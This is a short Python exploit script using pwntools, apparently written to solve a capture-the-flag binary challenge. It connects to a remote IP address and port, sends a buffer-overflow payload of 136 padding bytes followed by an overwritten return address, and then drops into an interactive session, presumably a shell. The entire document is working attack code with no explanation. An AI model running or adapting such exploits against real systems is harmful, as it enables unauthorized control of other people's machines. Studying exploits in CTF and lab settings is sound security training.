from pwn import *
p = remote('121.89.239.232', 10000)
payload = 'a'*136 + p64(0x400596)
p.sendline(payload)
p.interactive()